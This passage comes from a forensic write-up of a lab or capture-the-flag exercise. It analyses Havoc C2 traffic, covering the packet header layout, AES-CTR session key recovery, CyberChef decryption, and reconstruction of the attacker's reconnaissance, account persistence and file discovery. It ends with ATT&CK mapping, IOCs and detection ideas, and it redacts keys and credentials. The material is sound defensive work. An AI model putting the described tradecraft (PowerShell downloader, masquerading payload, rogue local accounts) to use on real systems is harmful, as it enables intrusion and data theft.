┌────────────┬──────────────┬───────────┬────────────┬────────────┐
│ PayloadSize│ Magic Bytes   │ Agent ID  │ Command ID │ Memory ID  │
└────────────┴──────────────┴───────────┴────────────┴────────────┘
     4 Bytes      4 Bytes      4 Bytes      4 Bytes      4 Bytes
```

### Total Header Length

```text
20 Bytes
```

Everything after this header belongs to the encrypted registration payload.

---

## Header Fields Explained

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Field**</table-cell>
    <table-cell>**Purpose During Investigation**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Payload Size</table-cell>
    <table-cell>Total encrypted payload length.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Magic Bytes</table-cell>
    <table-cell>Protocol identifier.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Agent ID</table-cell>
    <table-cell>Unique infected endpoint identifier.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Command ID</table-cell>
    <table-cell>Specifies packet purpose.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Memory ID</table-cell>
    <table-cell>Internal Havoc session value.</table-cell>
  </table-row>
</table>

---

## Command ID Mapping

The recovered parser maps integer values to Havoc commands.

<table columnSizing="auto">
  <table-row>
    <table-cell width="180">**Command ID**</table-cell>
    <table-cell>**Meaning**</table-cell>
  </table-row>
  <table-row>
    <table-cell>`99`</table-cell>
    <table-cell>DEMON_INIT</table-cell>
  </table-row>
  <table-row>
    <table-cell>`1`</table-cell>
    <table-cell>GET_JOB</table-cell>
  </table-row>
  <table-row>
    <table-cell>Other IDs</table-cell>
    <table-cell>Tasking / responses / callbacks.</table-cell>
  </table-row>
</table>

---

## Analyst Observation

The **Command ID** immediately distinguishes registration packets from ordinary beacon traffic.

That allows the analyst to ignore later packets until session keys have been recovered.

---

# 14.3 Finding DEMON_INIT in Wireshark

Inside Wireshark:

1. Locate the first HTTP POST after malware execution.
2. Inspect **File Data**.
3. Switch File Data to **Hex View**.

![Figure 08 — Hex View of DEMON\_INIT](../docs/assets/08_aes_key_iv.png)

**Figure 08 — Registration Packet Hex Layout**

### Visual Breakdown

<table columnSizing="auto">
  <table-row>
    <table-cell width="180">**Color Region**</table-cell>
    <table-cell>**Meaning**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Header Region</table-cell>
    <table-cell>20-byte Havoc request header.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Key Region</table-cell>
    <table-cell>32-byte AES session key.</table-cell>
  </table-row>
  <table-row>
    <table-cell>IV Region</table-cell>
    <table-cell>16-byte Initialization Vector.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Remaining Bytes</table-cell>
    <table-cell>Encrypted registration metadata.</table-cell>
  </table-row>
</table>

---

## Why Hex View Matters

Wireshark displays parsed fields, but CyberChef requires **raw hexadecimal ciphertext**.

Always copy:

```text
Right Click File Data
        │
        ▼
Copy
        ▼
As Hex Stream
```

This preserves byte order for decryption.

---

# 15. AES-CTR Cryptographic Analysis

> *The protocol cannot be decrypted until the AES session parameters are recovered.*

This is the cryptographic core of the investigation.

---

## Encryption Mode Used by Havoc

The recovered parser shows Havoc using:

<table columnSizing="auto">
  <table-row>
    <table-cell width="180">**Algorithm**</table-cell>
    <table-cell>AES</table-cell>
  </table-row>
  <table-row>
    <table-cell>Mode</table-cell>
    <table-cell>CTR (Counter Mode)</table-cell>
  </table-row>
  <table-row>
    <table-cell>Key Size</table-cell>
    <table-cell>32 Bytes</table-cell>
  </table-row>
  <table-row>
    <table-cell>IV Size</table-cell>
    <table-cell>16 Bytes</table-cell>
  </table-row>
</table>

### Why CTR Mode?

CTR mode:

* encrypts arbitrary-length payloads,
* allows independent block processing,
* is commonly used in modern C2 frameworks.

---

## AES Session Materials

Recovered during registration:

![Figure 09 — AES Key and IV](../docs/assets/08_aes_key_iv.png)

**Figure 09 — Session Cryptographic Material**

### Investigation Notes

<table columnSizing="auto">
  <table-row>
    <table-cell width="180">**Parameter**</table-cell>
    <table-cell>**Purpose**</table-cell>
  </table-row>
  <table-row>
    <table-cell>AES Key</table-cell>
    <table-cell>Decrypts Demon payloads.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Initialization Vector</table-cell>
    <table-cell>Initial counter state.</table-cell>
  </table-row>
</table>

### Public Repository Policy

The exact session key is intentionally omitted from this documentation.

```text
AES Key : [REDACTED]
AES IV  : [REDACTED]
```

The methodology is documented without exposing reusable values.

---

# 15.1 How CTR Mode Works

Conceptually:

```text
Counter
   │
   ▼
AES Encryption
   │
   ▼
Keystream
   │
   ▼
XOR Ciphertext
   │
   ▼
Plaintext
```

### Important Analyst Insight

CTR mode does **not** decrypt block-by-block like CBC.

Instead:

* counter increments,
* keystream generated,
* ciphertext XORed.

Understanding this explains why the IV must be correct.

---

# 15.2 Where Ciphertext Actually Begins

One of the most important discoveries during the investigation is that **File Data contains both protocol headers and ciphertext**.

### POST Requests

```text
20 Byte Header
──────────────────────────────
Encrypted Payload Starts Here
```

### Responses

```text
12 Byte Header
────────────────────────
Encrypted Payload Starts Here
```

### Header Offsets

<table columnSizing="auto">
  <table-row>
    <table-cell width="180">**Traffic Type**</table-cell>
    <table-cell>**Bytes Removed Before Decryption**</table-cell>
  </table-row>
  <table-row>
    <table-cell>POST Request</table-cell>
    <table-cell>20 Bytes (40 Hex Characters)</table-cell>
  </table-row>
  <table-row>
    <table-cell>HTTP Response</table-cell>
    <table-cell>12 Bytes (24 Hex Characters)</table-cell>
  </table-row>
</table>

This single observation is essential for successful decryption.

---

## Common Mistake

Attempting to decrypt the **entire File Data field** produces corrupted output.

Reason:

The Havoc protocol header is not encrypted metadata.

Always remove the header first.

---

# 16. CyberChef Decryption Workflow

Once the session key and IV have been recovered, CyberChef becomes the primary forensic tool.

![Figure 10 — CyberChef AES Decryption](../docs/assets/09_cyberchef_decryption.png)

**Figure 10 — CyberChef Workflow**

---

## Decryption Recipe

<table columnSizing="auto">
  <table-row>
    <table-cell width="180">**CyberChef Option**</table-cell>
    <table-cell>**Value**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Operation</table-cell>
    <table-cell>AES Decrypt</table-cell>
  </table-row>
  <table-row>
    <table-cell>Mode</table-cell>
    <table-cell>CTR</table-cell>
  </table-row>
  <table-row>
    <table-cell>Input</table-cell>
    <table-cell>Hex</table-cell>
  </table-row>
  <table-row>
    <table-cell>Output</table-cell>
    <table-cell>Raw</table-cell>
  </table-row>
  <table-row>
    <table-cell>Key</table-cell>
    <table-cell>Recovered Session Key</table-cell>
  </table-row>
  <table-row>
    <table-cell>IV</table-cell>
    <table-cell>Recovered Session IV</table-cell>
  </table-row>
</table>

---

## Workflow Diagram

```text
Wireshark
     │
     ▼
Copy File Data
     │
     ▼
Hex Stream
     │
     ▼
Remove Header Bytes
     │
     ▼
CyberChef AES CTR
     │
     ▼
Readable Metadata
```

---

## Recovering Metadata

After removing the request header:

![Figure 11 — Decrypted Metadata](../docs/assets/10_decrypted_metadata.png)

**Figure 11 — Successful Metadata Decryption**

### Metadata Contains

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Recovered Information**</table-cell>
    <table-cell>**Investigation Value**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Hostname</table-cell>
    <table-cell>Victim identification.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Username</table-cell>
    <table-cell>Compromised account context.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Operating System</table-cell>
    <table-cell>Victim platform confirmation.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Process Metadata</table-cell>
    <table-cell>Demon execution context.</table-cell>
  </table-row>
</table>

---

## Analyst Validation

Successful plaintext confirms:

* AES Key is correct.
* IV is correct.
* Header offset is correct.
* Packet selected is DEMON_INIT.

This validates the entire cryptographic workflow before decrypting attacker commands.

---

# 16.1 Understanding Beacon Check-ins

Not every POST request contains meaningful attacker commands.

Many requests consist only of heartbeat traffic.

### Characteristics

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Packet Type**</table-cell>
    <table-cell>**Purpose**</table-cell>
  </table-row>
  <table-row>
    <table-cell>20-byte POST</table-cell>
    <table-cell>Beacon check-in.</table-cell>
  </table-row>
  <table-row>
    <table-cell>12-byte Response</table-cell>
    <table-cell>No task issued.</table-cell>
  </table-row>
</table>

### Why Ignore Them?

Decrypting heartbeat packets wastes investigation time.

Instead, isolate packets containing encrypted payload lengths larger than header size.

---

## Wireshark Display Filter

The supplied investigation uses a filter to remove empty check-ins.

![Figure 12 — Wireshark Beacon Filter](../docs/assets/16_forensic_filter.png)

**Figure 12 — Filtering Meaningful Havoc Traffic**

### Investigation Benefit

* Removes noise.
* Keeps encrypted commands.
* Makes packet review significantly faster.

---

# 16.2 Decryption Workflow Checklist

<table columnSizing="auto">
  <table-row>
    <table-cell width="240">**Investigation Step**</table-cell>
    <table-cell>**Status**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Identify DEMON_INIT</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Recover AES Key</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Recover IV</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Copy Hex Stream</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Remove Protocol Header</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Decrypt Registration Metadata</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Validate Plaintext Output</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Proceed to Command Traffic</table-cell>
    <table-cell>Ready</table-cell>
  </table-row>
</table>

---

# Technical Findings (Sections 14–16)

<table columnSizing="auto">
  <table-row>
    <table-cell width="260">**Forensic Finding**</table-cell>
    <table-cell>**Evidence Established**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Havoc Framework Identified</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>DEMON_INIT Registration Located</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>20-byte Havoc Request Header Identified</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>12-byte Response Header Identified</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>AES CTR Encryption Confirmed</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Session Key Recovery Methodology Documented</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>IV Recovery Workflow Documented</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>CyberChef Decryption Workflow Validated</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
  <table-row>
    <table-cell>Encrypted Metadata Successfully Decoded</table-cell>
    <table-cell>✅</table-cell>
  </table-row>
</table>

---

# 17. Windows Artifact Recovery & Command Reconstruction

> *"Decrypting traffic is only half the investigation. The real objective is reconstructing attacker behavior."*

After recovering the Havoc session key and successfully decrypting the registration packet, the remaining encrypted HTTP traffic becomes readable. This stage transforms encrypted beacon traffic into a chronological record of attacker activity performed on the compromised Windows workstation.

Rather than searching for challenge answers, this investigation reconstructs:

* Windows identity artifacts.
* Network configuration.
* User context.
* Persistence mechanisms.
* File system discovery.
* Sensitive data access.

Each artifact is recovered directly from decrypted network traffic.

---

## Investigation Goals

This phase answers the following DFIR questions:

<table columnSizing="auto">
  <table-row>
    <table-cell width="260">**Investigation Question**</table-cell>
    <table-cell>**Evidence Source**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Who is the compromised Windows user?</table-cell>
    <table-cell>Decrypted command response.</table-cell>
  </table-row>
  <table-row>
    <table-cell>What operating system information was exposed?</table-cell>
    <table-cell>Registration metadata.</table-cell>
  </table-row>
  <table-row>
    <table-cell>What network configuration did the attacker enumerate?</table-cell>
    <table-cell>Decrypted `ipconfig` response.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Did the attacker establish persistence?</table-cell>
    <table-cell>Decrypted account creation command.</table-cell>
  </table-row>
  <table-row>
    <table-cell>What sensitive files were accessed?</table-cell>
    <table-cell>Decrypted filesystem discovery.</table-cell>
  </table-row>
</table>

---

# 17.1 Understanding Havoc Command Traffic

Once registration completes, the Teamserver begins issuing encrypted tasks to the Demon agent.

Each attacker action follows the same communication model.

## Havoc Task Exchange

```text id="elckwk"
Teamserver
     │
Encrypted HTTP Response
     │
     ▼
Demon Agent Executes Command
     │
     ▼
Encrypted HTTP POST Response
     │
     ▼
Teamserver Receives Output
```

Every attacker command has two observable packets:

1. **Command Packet** — issued by the Teamserver.
2. **Response Packet** — output returned from the victim.

---

## Forensic Workflow

```text id="w0g7xt"
Encrypted HTTP Response
        │
        ▼
Remove 12-byte Header
        │
        ▼
AES-CTR Decrypt
        │
        ▼
Readable Windows Command
        │
        ▼
Correlate Response Packet
        │
        ▼
Recover Artifact
```

This process is repeated throughout the investigation.

---

# 17.2 Windows Identity Enumeration

One of the earliest decrypted responses reveals the identity of the compromised Windows account.

![Figure 11 — Windows SID Artifact](../docs/assets/11_sid_artifact.png)

**Figure 11 — Decrypted Windows Security Identifier**

---

## Why SID Enumeration Matters

Windows Security Identifiers uniquely identify user accounts.

Attackers often enumerate SIDs to:

* identify privileged users,
* enumerate local accounts,
* understand domain membership,
* prepare privilege escalation.

---

## Evidence Interpretation

The decrypted response exposes a Windows SID associated with the active user session.

### Public Repository Policy

The SID is intentionally hidden.

```text id="ew9f36"
Windows SID

[REDACTED]
```

---

## Forensic Importance

A SID provides investigators with:

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Artifact**</table-cell>
    <table-cell>**Investigation Value**</table-cell>
  </table-row>
  <table-row>
    <table-cell>User Identity</table-cell>
    <table-cell>Identifies compromised account.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Domain Context</table-cell>
    <table-cell>Determines domain or local membership.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Privilege Context</table-cell>
    <table-cell>Supports privilege investigation.</table-cell>
  </table-row>
</table>

---

## Blue Team Detection Opportunity

Possible telemetry sources:

* Windows Event ID **4688**
* Windows Event ID **4624**
* Sysmon Process Creation
* PowerShell logging

---

# 17.3 Network Configuration Discovery

The attacker next performs network reconnaissance.

This reveals host networking information.

![Figure 12 — IPv6 Configuration Artifact](../docs/assets/12_ipv6_artifact.png)

**Figure 12 — Decrypted Network Configuration Response**

---

## Likely Objective

The attacker wants to determine:

* IP addresses.
* IPv6 configuration.
* DNS configuration.
* Network adapters.
* Routing information.

---

## Why IPv6 Matters

IPv6 information can reveal:

* internal addressing,
* network segmentation,
* interface identifiers,
* additional communication paths.

---

## Public Documentation Redaction

The recovered IPv6 address is intentionally hidden.

```text id="e5x7ck"
IPv6 Address

[REDACTED]
```

---

## Defensive Perspective

Network discovery aligns with ATT&CK reconnaissance techniques.

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**ATT&CK Technique**</table-cell>
    <table-cell>**Description**</table-cell>
  </table-row>
  <table-row>
    <table-cell>T1016</table-cell>
    <table-cell>System Network Configuration Discovery.</table-cell>
  </table-row>
</table>

---

## Detection Opportunities

Monitor execution of:

* `ipconfig`
* `netsh`
* `route`
* `arp`
* `whoami`
* `hostname`

Especially when initiated from suspicious parent processes.

---

# 17.4 Host Reconnaissance Timeline

The decrypted traffic demonstrates structured reconnaissance.

## Host Discovery Sequence

```text id="mq0m4u"
Beacon Established
        │
        ▼
Hostname Enumeration
        │
        ▼
Username Enumeration
        │
        ▼
SID Enumeration
        │
        ▼
Network Configuration
        │
        ▼
Environment Discovery
```

Rather than random commands, reconnaissance follows a logical progression.

---

## Analyst Observation

This behavior resembles common post-exploitation tradecraft.

The attacker first identifies the environment before establishing persistence.

---

# 18. Persistence Analysis

> *Persistence separates an initial compromise from long-term access.*

The decrypted traffic later reveals commands that establish persistence on the compromised workstation.

---

## Evidence of Account Creation

![Figure 13 — Persistence Command Artifact](../docs/assets/13_persistence_artifact.png)

**Figure 13 — Decrypted Persistence Activity**

---

## Persistence Technique

The attacker creates a new Windows user account.

### Why This Matters

Creating a local account provides:

* continued access,
* alternate credentials,
* recovery if malware is removed.

---

## ATT&CK Mapping

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Technique**</table-cell>
    <table-cell>**Description**</table-cell>
  </table-row>
  <table-row>
    <table-cell>T1136</table-cell>
    <table-cell>Create Account.</table-cell>
  </table-row>
</table>

---

## Redacted Evidence

The repository intentionally hides credentials.

```text id="xsxq8l"
Username : [REDACTED]

Password : [REDACTED]
```

This preserves educational value while preventing plagiarism.

---

## Defensive Detection Opportunities

Windows logs generated by account creation include:

<table columnSizing="auto">
  <table-row>
    <table-cell width="160">**Event ID**</table-cell>
    <table-cell>**Meaning**</table-cell>
  </table-row>
  <table-row>
    <table-cell>4720</table-cell>
    <table-cell>User Account Created.</table-cell>
  </table-row>
  <table-row>
    <table-cell>4722</table-cell>
    <table-cell>User Account Enabled.</table-cell>
  </table-row>
  <table-row>
    <table-cell>4732</table-cell>
    <table-cell>User Added to Local Group.</table-cell>
  </table-row>
</table>

---

## Blue Team Recommendation

Alert when:

* local users are created,
* privileged groups modified,
* account creation follows suspicious PowerShell execution.

---

# 18.1 Persistence Timeline

```text id="p0yljv"
Malware Execution
       │
       ▼
C2 Registration
       │
       ▼
Reconnaissance
       │
       ▼
User Account Creation
       │
       ▼
Continued Beacon Activity
```

Persistence occurs **after reconnaissance**, indicating attacker confidence in the environment.

---

# 18.2 Why Persistence Happens Later

Attackers often wait until:

* host validated,
* connectivity confirmed,
* environment understood.

This minimizes unnecessary artifacts on unstable hosts.

---

# 19. Sensitive File Discovery

After persistence, the attacker begins searching the filesystem.

![Figure 14 — Sensitive File Discovery](../docs/assets/15_clients_csv_artifact.png)

**Figure 14 — Filesystem Discovery Result**

---

## Discovered File

One decrypted response reveals a business-related CSV file.

```text id="0qegux"
C:\Users\paco\Desktop\Files\clients.csv
```

---

## Why This File Matters

This indicates attacker interest in:

* customer information,
* sensitive business records,
* potentially exfiltration targets.

The filename itself provides investigative context without revealing challenge answers.

---

## ATT&CK Mapping

<table columnSizing="auto">
  <table-row>
    <table-cell width="220">**Technique**</table-cell>
    <table-cell>**Description**</table-cell>
  </table-row>
  <table-row>
    <table-cell>T1083</table-cell>
    <table-cell>File and Directory Discovery.</table-cell>
  </table-row>
</table>

---

## Analyst Interpretation

The attacker is transitioning from:

Reconnaissance

↓

Persistence

↓

Sensitive File Discovery

This progression resembles real-world intrusion activity.

---

# 19.1 File Discovery Workflow

```text id="wqcx7u"
Encrypted Command
        │
        ▼
Filesystem Enumeration
        │
        ▼
Matching Sensitive File
        │
        ▼
Encrypted Response
        │
        ▼
Recovered File Path
```

The PCAP alone documents this behavior.

---

## Defensive Recommendations

Monitor processes performing:

* recursive directory searches,
* CSV discovery,
* access to Desktop business folders.

---

# 19.2 Sensitive Data Access

The next decrypted response contains challenge-related content retrieved from the discovered CSV.

![Figure 15 — Decrypted File Response](../docs/assets/16_answer_validation.png)

**Figure 15 — Sensitive File Access Response**

---

## Repository Redaction

The contents are intentionally removed.

```text id="lxp5zr"
Challenge Artifact

[REDACTED]
```

The methodology remains reproducible without publishing answers.

---

# 20. Complete Attacker Timeline Reconstruction

This investigation now reconstructs the attacker timeline chronologically.

## Full Kill Chain

```text id="hja6ni"
HTTP GET install.ps1
        │
        ▼
PowerShell Downloader
        │
        ▼
Download notepad.exe
        │
        ▼
Execute Demon Agent
        │
        ▼
HTTP Beacon Registration
        │
        ▼
DEMON_INIT
        │
        ▼
AES Session Established
        │
        ▼
Encrypted Tasking Begins
        │
        ▼
Hostname Discovery
        │
        ▼
SID Enumeration
        │
        ▼
Network Discovery
        │
        ▼
Persistence Account Created
        │
        ▼
Filesystem Discovery
        │
        ▼
Sensitive File Access
```

---

## Incident Timeline Table

<table columnSizing="auto">
  <table-row>
    <table-cell width="180">**Incident Phase**</table-cell>
    <table-cell>**Recovered Evidence**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Initial Access</table-cell>
    <table-cell>PowerShell downloader retrieved.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Execution</table-cell>
    <table-cell>`notepad.exe` executed.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Command & Control</table-cell>
    <table-cell>Havoc registration packet observed.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Discovery</table-cell>
    <table-cell>Hostname, SID, IPv6 recovered.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Persistence</table-cell>
    <table-cell>Windows account created.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Collection</table-cell>
    <table-cell>Sensitive CSV discovered.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Challenge Artifact</table-cell>
    <table-cell>Recovered but redacted.</table-cell>
  </table-row>
</table>

---

# Windows Artifacts Summary

<table columnSizing="auto">
  <table-row>
    <table-cell width="260">**Recovered Artifact**</table-cell>
    <table-cell>**Repository Status**</table-cell>
  </table-row>
  <table-row>
    <table-cell>Windows SID</table-cell>
    <table-cell>🔒 Redacted</table-cell>
  </table-row>
  <table-row>
    <table-cell>IPv6 Address</table-cell>
    <table-cell>🔒 Redacted</table-cell>
  </table-row>
  <table-row>
    <table-cell>Persistence Username</table-cell>
    <table-cell>🔒 Redacted</table-cell>
  </table-row>
  <table-row>
    <table-cell>Persistence Password</table-cell>
    <table-cell>🔒 Redacted</table-cell>
  </table-row>
  <table-row>
    <table-cell>Business CSV Path</table-cell>
    <table-cell>✅ Included</table-cell>
  </table-row>
  <table-row>
    <table-cell>Challenge Flag</table-cell>
    <table-cell>🔒 Redacted</table-cell>
  </table-row>
</table>

---

# Evidence Correlation Summary

<table columnSizing="auto">
  <table-row>
    <table-cell width="260">**Evidence Source**</table-cell>
    <table-cell>**Finding**</table-cell>
  </table-row>
  <table-row>
    <table-cell>HTTP Stream</table-cell>
    <table-cell>PowerShell downloader.</table-cell>
  </table-row>
  <table-row>
    <table-cell>HTTP Object Export</table-cell>
    <table-cell>Malware executable recovered.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Strings Analysis</table-cell>
    <table-cell>Havoc attribution.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Registration Packet</table-cell>
    <table-cell>AES Key / IV recovery.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Decrypted Commands</table-cell>
    <table-cell>Windows reconnaissance.</table-cell>
  </table-row>
  <table-row>
    <table-cell>Decrypted Responses</table-cell>
    <table-cell>Persistence and filesystem artifacts.</table-cell>
  </table-row>
</table>

---

# 21. MITRE ATT&CK Analysis

> *Mapping attacker behavior to MITRE ATT&CK helps defenders understand tactics, techniques, and detection opportunities.*

The Mayhem investigation exposes a complete post-exploitation workflow. Every attacker action observed inside the packet capture can be mapped to one or more MITRE ATT&CK techniques.

Rather than simply identifying malware, ATT&CK mapping translates packet evidence into standardized adversary behavior.

---

## ATT&CK Kill Chain Overview

| ATT&CK Tactic             | Technique                            | Evidence Observed                                                    |
| ------------------------- | ------------------------------------ | -------------------------------------------------------------------- |
| **Execution**             | **T1059.001 — PowerShell**           | `install.ps1` downloads and launches malware.                        |
| **Command and Control**   | **T1071.001 — Web Protocols (HTTP)** | Havoc Demon communicates over HTTP POST requests.                    |
| **Command and Control**   | **T1573 — Encrypted Channel**        | AES-CTR encrypted payloads exchanged between Demon and Teamserver.   |
| **Defense Evasion**       | **T1036 — Masquerading**             | Payload masquerades as `notepad.exe`.                                |
| **Ingress Tool Transfer** | **T1105**                            | HTTP transfers executable to Downloads directory.                    |
| **Discovery**             | **T1016**                            | Network configuration enumeration (`ipconfig`).                      |
| **Discovery**             | **T1082**                            | Operating system and host information recovered during registration. |
| **Discovery**             | **T1033**                            | User identity enumeration (`whoami`, SID recovery).                  |
| **Discovery**             | **T1083**                            | Sensitive file discovery (`clients.csv`).                            |
| **Persistence**           | **T1136**                            | Windows account creation for persistence.                            |

---

## MITRE Attack Flow

```text
Execution
   │
   ▼
PowerShell Downloader
   │
   ▼
Ingress Tool Transfer
   │
   ▼
Masquerading Executable
   │
   ▼
HTTP Command & Control
   │
   ▼
Encrypted C2 Channel
   │
   ▼
Host Discovery
   │
   ▼
Persistence
   │
   ▼
Sensitive File Discovery
```

---

## ATT&CK Heatmap (Narrative)

The observed activity primarily covers **Execution**, **Command & Control**, **Discovery**, and **Persistence**.

**High Confidence Tactics Observed**

* Execution
* Discovery
* Command & Control
* Persistence

**Medium Confidence**

* Collection
* Defense Evasion

**Not Observed**

* Lateral Movement
* Credential Access
* Privilege Escalation
* Exfiltration (not evidenced within supplied PCAP)

---

# 22. Indicators of Compromise (IOCs)

Indicators recovered during the investigation are categorized below.

## Network Indicators

| IOC Category          | Observation                 |
| --------------------- | --------------------------- |
| Victim Host           | `10.0.2.38`                 |
| Suspicious Server     | `10.0.2.37`                 |
| Initial Transfer Port | TCP 1337                    |
| Transport Protocol    | HTTP                        |
| Beacon Protocol       | HTTP POST                   |
| Encryption            | AES-CTR                     |
| Beacon Pattern        | Periodic HTTP POST requests |

---

## Host Indicators

| IOC                    | Description                          |
| ---------------------- | ------------------------------------ |
| `install.ps1`          | Initial PowerShell downloader.       |
| `notepad.exe`          | Masquerading payload.                |
| Downloads Directory    | Malware staging location.            |
| Windows SID            | User identity artifact *(redacted)*. |
| IPv6 Address           | Network artifact *(redacted)*.       |
| Local Account Creation | Persistence artifact *(redacted)*.   |

---

## Malware Indicators

| Indicator       | Purpose                                   |
| --------------- | ----------------------------------------- |
| `demon.x64.exe` | Havoc Demon reference.                    |
| Havoc Metadata  | Registration packet artifact.             |
| AES Session Key | Session encryption material *(redacted)*. |
| AES IV          | CTR initialization vector *(redacted)*.   |

---

## Filesystem Indicators

| Artifact                | Investigation Context                                |
| ----------------------- | ---------------------------------------------------- |
| `clients.csv`           | Sensitive business file identified during discovery. |
| Downloads Directory     | Malware storage location.                            |
| Desktop Business Folder | Data discovery target.                               |

---

## IOC Confidence Assessment

| IOC Type                 | Confidence |
| ------------------------ | ---------- |
| Host IP Addresses        | High       |
| PowerShell Downloader    | High       |
| Havoc Demon Strings      | High       |
| HTTP Beaconing           | High       |
| Persistence Account      | High       |
| Sensitive File Discovery | High       |

---

# 23. Detection Engineering

> *A forensic investigation should always end with detection opportunities.*

This section converts findings into SOC detection ideas.

---

## Detection Strategy Overview

| Detection Layer | Opportunity                   |
| --------------- | ----------------------------- |
| Endpoint        | PowerShell process creation.  |
| Network         | HTTP beaconing detection.     |
| Identity        | New user creation.            |
| Filesystem      | Sensitive file access.        |
| Threat Hunting  | Havoc beacon characteristics. |

---

# 23.1 Sigma Detection Ideas

### Suspicious PowerShell Downloader

**Detection Logic**

* PowerShell launches.
* Network connection follows.
* Downloads executable.
* Starts executable immediately.

**Potential Data Sources**

* Windows Event Logs
* Sysmon
* Microsoft Defender
* Sentinel

---

### Masquerading Executable

**Detection Conditions**

* Executable named after Windows utility.
* Executed from Downloads.
* Network communication begins shortly after execution.

**Examples**

* `notepad.exe`
* `svchost.exe`
* `explorer.exe`
* `chrome.exe`

Executed outside expected Windows directories.

---

### Local User Creation Detection

**Events**

| Event ID | Description          |
| -------- | -------------------- |
| 4720     | User Created         |
| 4722     | User Enabled         |
| 4732     | Added to Local Group |

**SOC Alert**

> New local account created immediately after PowerShell execution.

---

# 23.2 Sysmon Detection Opportunities

| Sysmon Event | Detection Use                      |
| ------------ | ---------------------------------- |
| Event ID 1   | PowerShell Process Creation        |
| Event ID 3   | HTTP Connection                    |
| Event ID 7   | DLL / Image Loading                |
| Event ID 11  | Executable Written                 |
| Event ID 13  | Registry Persistence Investigation |
| Event ID 22  | DNS Investigation                  |

---

## Sysmon Investigation Timeline

```text
PowerShell.exe
      │
      ▼
Network Connection
      │
      ▼
File Created
      │
      ▼
Executable Started
      │
      ▼
Outbound HTTP Beacon
```

---

# 23.3 Splunk Hunting Ideas

### PowerShell Network Activity

Example search idea:

```spl
index=windows EventCode=4688 powershell.exe
```

---

### Suspicious Downloads Folder Execution

Search for process executions originating from:

```text
C:\Users\*\Downloads\
```

---

### New Local User

```spl
EventCode=4720
```

Correlate with PowerShell execution within a short time window.

---

# 23.4 Suricata Detection Concepts

Network IDS opportunities include:

### HTTP Download Detection

Alert when:

* HTTP downloads `.exe`
* Download occurs from unusual port (`1337`)
* Internal-to-internal HTTP executable transfer.

---

### Beacon Detection

Potential indicators:

* Repeated POST requests.
* Consistent payload size.
* Fixed destination.
* Regular interval beaconing.

---

# 23.5 YARA Detection Concepts

Static malware indicators:

* Havoc strings.
* Demon metadata.
* Suspicious PE imports.
* PowerShell downloader artifacts.

YARA should combine:

* strings,
* PE metadata,
* section names,
* protocol markers.

---

# 24. Threat Hunting Playbook

## Hunt Objective

Identify endpoints communicating with Havoc infrastructure.

---

## Hunt 1 — PowerShell Downloader

Questions:

* Which endpoints executed PowerShell?
* Which PowerShell sessions opened network connections?
* Were executables downloaded?

---

## Hunt 2 — Downloads Folder Executions

Look for executables launched from:

* Downloads
* Temp
* Public
* AppData

---

## Hunt 3 — Internal HTTP Servers

Questions:

* Which hosts serve executables internally?
* Which hosts listen on uncommon ports?
* Which systems host Python HTTP servers?

---

## Hunt 4 — Beaconing Behavior

Characteristics:

* HTTP POST
* Fixed interval
* Same destination host
* Binary payloads
* Small request headers
* Consistent encrypted responses

---

## Hunt 5 — Persistence

Search for:

* User creation.
* Local group modification.
* Scheduled tasks.
* Services.
* Startup folders.

---

# 24.1 DFIR Investigation Checklist

## Network

* [x] Identify suspicious hosts.
* [x] Reconstruct HTTP streams.
* [x] Export transferred objects.
* [x] Recover encrypted payloads.

---

## Malware

* [x] Static strings analysis.
